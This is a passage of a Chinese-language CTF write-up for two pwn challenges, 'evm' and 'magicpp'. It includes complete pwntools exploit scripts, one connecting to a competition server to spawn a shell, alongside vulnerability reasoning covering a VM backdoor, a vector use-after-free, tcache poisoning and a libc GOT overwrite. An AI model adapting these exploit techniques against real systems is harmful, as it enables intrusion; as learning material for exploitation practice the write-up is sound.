  read(0, page_elememnt_0, *(size_t *)now_ptr.len);
  for ( i = 0; (unsigned __int64)i < *(_QWORD *)now_ptr.len >> 2; ++i )
  {
    if ( *((_DWORD *)page_elememnt_0 + i) != 0x13 )
      _Exit(1);
  }
  process_code_memory(emula, 0);
  process_code_memory(emula, 1u);
  clean_chunk_1000_ptr_page_table_addr_content(emula, 0);
  clean_chunk_1000_ptr_page_table_addr_content(emula, 1u);
  return v9 - __readfsqword(0x28u);
}
```

漏洞
--

有后门

自己造了两个一级页表，里面都只有1个页表项，然后可以往页表项的对应内存输入

需要第一个页表执行执行完才能触发后门，有/bin/sh的地址，没开pie，寄存器可以越界修改到后门用的参数

第二个页表的页表项输入的有限制，需要全是19，但可以通过第一个页表的页表项输入的指令改第二个页表项对应的物理地址内容（主机的虚拟地址）

由于页表项对应的物理地址的12-21位是随机生成的，所以需要往物理地址的每个页面写后门指令，使得第二个页表的页表项的物理地址的指令处也能被改到

2的9次方&lt;0x1000/4（可写的指令个数）发现还有一些其他的，是不够的（可能是我没优化到位）

本地通了，远程老是失败，将payload改短，增加爆破次数就行，不然有三血，可惜后面还是完了点，拿个四血

exp
---

```python
from pwn import *

def pwn():
    p=remote("8.147.129.22",40300)
    #p=process("./evm")
    #   case 16:
    #             dest = ((unsigned __int16)code >> 7) & 0x1F;
    #             src_1 = (code >> 15) & 0x1F;
    #             v8 = HIWORD(code) >> 4;
    #             result = (BYTE1(code) >> 4) & 7;
    #             switch ( (BYTE1(code) >> 4) & 7 )   // 寄存器和立即数操作的结果给寄存器
    #             {
    #               case 0:
    #                 result = (__int64)emula;
    #                 emula->reg[dest] = emula->reg[src_1] + v8;
    #                 break;
    #                case 1:
                    # result = (__int64)emula;
                    # emula->reg[dest] = emula->reg[src_1] << (v8 & 0x3F);
                    # break;
    #  reg0=0
    #  reg0=reg0+1
    #  reg2=reg0<<12
    # reg2=reg2+0xff0

    # case 44:                              // 寄存器赋值给寄存器作为偏移的物理地址
    #             v16 = emula->reg[(code >> 15) & 0x1F] + (((unsigned __int16)code >> 7) & 0x1F) + 32 * (HIBYTE(code) >> 1);
    #             v18 = emula->reg[(HIWORD(code) >> 4) & 0x1F];
    #             v21 = (_QWORD *)(emula->chunk_200000_ptr + v16);
    #             if ( v16 > 0x1FFFFF )
    #               _Exit(1);
    #             result = (BYTE1(code) >> 4) & 7;
    #             if ( (_DWORD)result == 3 )
    #             {
    #               result = emula->chunk_200000_ptr + v16;
    #               *v21 = v18;
    #             }
    #
    # reg1=0 
    # reg1=reg1+0x73

    # v16=reg0

    # *(_QWORD *)(reg0+chunk_200000_ptr)=reg1
    init_reg1=p32(19|(0x73<<20)|1<<7|1<<15 )+p32(19|(0x50<<20)|0<<7|0<<15 ) 
    cover_payload=p32(19|(1<<20))+p32(19|(1<<12|2<<7|12<<20))
    cover_payload=cover_payload+p32(19|2<<7|2<<15|0xff0<<20)+p32(47|3<<12|2<<15|1<<20)
    cover_payload_all=b""
    for i in range(0x40):
        cover_payload_all=cover_payload_all+cover_payload
    execve_num=59
    bin_sh=0x00000000004050

    # case 0:
    #                 result = (__int64)emula;
    #                 emula->reg[dest] = emula->reg[src_1] + v8;
    #                 break;
    #  case 1:
    #                 result = (__int64)emula;
    #                 emula->reg[dest] = emula->reg[src_1] << (v8 & 0x3F);
    #                 break;
        # case 7:
        #             result = (__int64)emula;
        #             emula->reg[dest] = v8 & emula->reg[src_1];
        #             break;

    # reg[10]=0&reg[10]
    # reg[11]=0&reg[11]
    # reg[10]=reg[10]+59
    # reg[11]=reg[11]+405
    # reg[11]=reg[11]<<12
    # reg[11]=reg[11]+0xa0

    construct_arg=p32(19|7<<12|10<<7|10<<15) + p32(19|7<<12|11<<7|11<<15)
    construct_arg=construct_arg+p32(19|10<<7|10<<15|59<<20)+p32(19|11<<7|11<<15|0x405<<20)
    construct_arg=construct_arg+p32(19|1<<12|11<<7|11<<15|12<<20)+p32(19|11<<7|11<<15|0xa0<<20)

    payload=init_reg1+cover_payload_all+construct_arg

    # gdb.attach(p)
    # pause()
    context(os="linux",arch="amd64",log_level="debug")
    p.sendlineafter(b"maybe not standard\n", str(len(payload)).encode())
    p.sendline(str(0))
    instruct=payload
    p.send(instruct)   
    p.sendline(str(4))
    p.sendline(str(0))
    instruct=p32(0x13)   # padding
    p.send(instruct)
    p.interactive()

while(1):
    pwn()

```

magicpp
=======

[乘法变除法](https://blog.iret.xyz/posts/those-magic-compiler-optimization/)

不能逆。。。just llike强网杯那道一样，全靠猜  
我是傻逼，能逆，之前有阴影了。。。。

能够加载文件，直接加载/proc/self/maps，泄露地址，book起步是1

用fuzz能出，python fuzz出现`malloc(): unsorted double linked list corrupted\`，先把分支增多，如果有crash，再把分支减少，直到不能再少分支，这样能够排除一些对触发crash无影响的操作，然后再改fuzz操作，直到追踪到具体的原因

```c
if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
```

```c
unsortedbin
all [corrupted]
FD: 0x5b1832653c40 ◂— 0x30 /* '0' */
BK: 0x5b1832653c40 —▸ 0x73fea921ace0 (main_arena+96) ◂— 0x5b1832653c40

```

这里最后发现无论inset的size多大，只要次数超过48次就会出现上述bug

发现是当不停往vector里push时，当超过其范围时会free掉原来，然后申请个更大的，如果原来那个free掉的够大，就会进入unsortedbin，那么我们可以申请来分割

发现unsortedbin中的fd被改了，应该是有个edit after free，然后看看啥时候改的，发现是在free掉原来的进入unsortedbin后改的。

```c
    first_book = (_QWORD *)get_index_chunk(&vector, 0LL);
    value_sum = add_book_and_return_sum(&book);
    *first_book = value_sum;
```

这里`add_book_and_return_sum`可能会free掉原来的，然后此时first\_book 是已经进入unsortedbin了。

exp
---

/proc/self/maps能泄露地址，然后这个能改fd，然后有delete能free掉context块，直接打tcache的fd就好了，由于是将0x719f8a1d5040 (\_rtld\_global)和其他value值相加的和来写fd，想打栈发现随机化改变stack基地址还改变内部偏移量。

应该是可以打IO house of cat的或者exit，但为了学点新东西，这里也可以打libcgot。会调用libc里的got表里的函数在load里。三种方法懒得写了

```python
from pwn import *
import random
context(os="linux",arch="amd64",log_level="debug")

def randinit(n):
    return random.randint(1, n)

def insert(value,book_name,book_size,book_context):
    p.sendlineafter(b"Enter your choice: ",str(1))
    p.sendlineafter(b"Enter the value: ",value )
    p.sendlineafter(b"Enter the book name: ",book_name)
    p.sendlineafter(b"Enter the context size: ",book_size)
    p.sendlineafter(b"Enter the context: ",book_context)

def delete(index):
    p.sendlineafter(b"Enter your choice: ",str(2))
    p.sendlineafter(b"Enter the index: ",index)

def sort():
    p.sendlineafter(b"Enter your choice: ",str(3))

def load(filename):
    p.sendlineafter(b"Enter your choice: ",str(4))
    p.sendlineafter(b"Enter the file name: ",filename)

def save(index):
    p.sendlineafter(b"Enter your choice: ",str(5))
    p.sendlineafter(b"Enter the book idx: ",index)

def show(index):
    p.sendlineafter(b"Enter your choice: ",str(6))
    p.sendlineafter(b"Enter the book idx: ",index)

def exit():
    p.sendlineafter(b"Enter your choice: ",str(7)) 

p=process("./pwn")
gdb.attach(p)
pause()
p.sendlineafter("Enter your name: ",b"llk")

load(b"/proc/self/maps")
show(str(1))

heappart=(p.recvuntil(b" rw-p 00000000 00:00 0                          [heap]",drop=True)).decode('utf-8')
libcpart=(p.recvuntil(b" r--p 00000000 08:03 1311935                    /home/llk/Desktop/pwn/2024_WMCTF/magicpp_e4a2bf175f5943f40cd83921b9b43853/libc.so.6",drop=True)).decode('utf-8')
ldpart=(p.recvuntil(b" r--p 00000000 08:03 788592                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",drop=True)).decode('utf-8')
stackpart=(p.recvuntil(b" rw-p 00000000 00:00 0                          [stack]",drop=True)).decode('utf-8')

heap=int(heappart[-25:-13],16)
libc=int(libcpart[-25:-13],16)
stack=int(stackpart[-25:-13],16)
ld=int(ldpart[-25:-13],16)
print(f"Heap Address: {hex(heap)}")
print(f"Libc Address: {hex(libc)}")
print(f"Stack Address: {hex(stack)}")
print(f"ld Address: {hex(ld)}")

insert(str(0),str(1),str(0x3c0),str(1))
delete(str(2))
for i in range(21):
    insert(str(0),str(1),str(1),str(1))

payloa=(libc+0x000000000021A0A0)^((heap+0x11000)>>12) # dest
insert(str(payloa),str(1),str(1),str(1))
payload=-(0x3a040+ld)
print("+++++++++++++++++"+hex(payload))
insert(str(payload),str(1),str(1),str(1))

insert(str(1),str(1),str(0x3c0),str(1))
pause()

payload=p64(0x19a144+libc)+p64(0xC5BF8+libc)+p64(0x1a2140+libc)+p64(0x148303+libc)+p64(0x199700+libc)+p64(0x28170+libc)+p64(0x28180+libc)+p64(0x80520+libc)
insert(str(1),str(1),str(0x3c0),payload) # write to dest

# .text:000000000013B748                 mov     rsi, [rsp+30h]
# .text:000000000013B74D                 mov     rdi, [rsp+18h]
# .text:000000000013B752                 call    j_strcpy

# .text:0000000000147F26                 mov     rdi, [rsp+8]
# .text:0000000000147F2B                 mov     rsi, r12
# .text:0000000000147F2E                 call    j_strcpy

# .text:0000000000148303                 mov     rsi, [rsp+20h]
# .text:0000000000148308                 mov     rdi, [rsp+8]
# .text:000000000014830D                 call    j_strcpy

# .text:0000000000153D61                 mov     rdi, [rsp+18h]
# .text:0000000000153D66                 mov     rsi, rbp
# .text:0000000000153D69                 call    j_strcpy

# .text:00000000000C5BF8                 pop     rbx
# .text:00000000000C5BF9                 pop     rbp
# .text:00000000000C5BFA                 pop     r12
# .text:00000000000C5BFC                 pop     r13
# .text:00000000000C5BFE                 jmp     j_wmemset_0

# .got.plt:000000000021A0A8 off_21A0A8      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r
# .got.plt:000000000021A0A8                                         ; Indirect relocation
# .got.plt:000000000021A0B0 off_21A0B0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r
# .got.plt:000000000021A0B0                                         ; Indirect relocation
# .got.plt:000000000021A0B8 off_21A0B8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r
# .got.plt:000000000021A0B8                                         ; Indirect relocation
# .got.plt:000000000021A0C0 off_21A0C0      dq offset memrchr       ; DATA XREF: j_memrchr+4↑r
# .got.plt:000000000021A0C0                                         ; Indirect relocation
# .got.plt:000000000021A0C8 off_21A0C8      dq offset _dl_deallocate_tls
# .got.plt:000000000021A0C8                                         ; DATA XREF: __dl_deallocate_tls+4↑r
# .got.plt:000000000021A0D0 off_21A0D0      dq offset __tls_get_addr
# .got.plt:000000000021A0D0                                         ; DATA XREF: ___tls_get_addr+4↑r
# .got.plt:000000000021A0D8 off_21A0D8      dq offset wmemset     
p.interactive()
# file=open('fuzz.txt', 'w') 
# p=process("./pwn")
# gdb.attach(p)
# pause()
# p.sendlineafter("Enter your name: ",b"llk")
# for i in range(0x1000):
#     match randinit(1):
#         case 1:
#             size=randinit(0x1000)
#             insert(b"1",b"1",str(1),b"1")
#             file.write("insert size"+str(1)+"\n")
#             file.flush()
#         case 2:
#             index=randinit(0x100)
#             delete(str(index))
#             file.write("delete index "+str(index)+"\n")
#             file.flush()
#         case 3:
#             sort()
#             file.write("sort \n")
#             file.flush()

```